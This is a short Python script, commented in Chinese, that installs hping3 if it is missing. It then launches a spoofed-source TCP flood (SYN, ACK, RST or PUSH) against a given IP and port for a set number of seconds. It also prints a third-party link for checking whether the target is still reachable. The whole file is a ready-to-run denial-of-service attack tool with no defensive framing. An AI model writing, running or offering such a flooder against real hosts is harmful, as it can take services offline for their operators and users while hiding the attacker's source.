import subprocess
import sys
import time

def check_hping3():
    try:
        # 执行 hping3 -v 检查是否已安装
        result = subprocess.run(
            ["hping3", "-v"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True  # 兼容 Python 3.6
        )

        # 如果输出包含 hping3 字样，说明已安装
        if "hping3" in result.stdout.lower():
            return True
        else:
            print("[-] 未检测到 hping3")
            return False

    except FileNotFoundError:
        # hping3 命令不存在
        print("[-] hping3 未安装（命令未找到）")
        return False

def install_hping3():
    print("[*] 正在尝试自动安装 hping3 ...")
    try:
        # 更新软件源信息
        subprocess.run(["apt", "update"], check=True)
        # 安装 hping3
        subprocess.run(["apt", "install", "-y", "hping3"], check=True)
        print("[+] hping3 安装成功！")
    except subprocess.CalledProcessError as e:
        print(f"[!] 安装 hping3 时出错: {e}")



if __name__ == "__main__":
    try:
        if check_hping3() == False:
            install_hping3()
        args = sys.argv
        if len(args) != 6 or args[3].lower() not in ["syn", "ack", "rst", "push"]:
            print(f"Usage: {args[0]} ip port type data time")
            print("type: syn ack rst push")
            exit()

        ip, port, type, data, time_ = args[1:6]
        type = type[:1].upper()  # 将 type 的首字母转换为大写
        time_ = int(time_)

        # 执行 hping3 命令
        process = subprocess.Popen(['hping3', '--flood', f'-{type}', '-w', '64', '-p', port, '--rand-source', ip, '--data', data])
        print(f"\n\n查看状态:  https://www.itdog.cn/tcping/{ip}:{port}\n")
        time.sleep(time_)
        
        process.terminate()
        process.wait()
        exit()
    
    except KeyboardInterrupt:
        if 'process' in locals():
            process.terminate()
            process.wait()
            exit()
    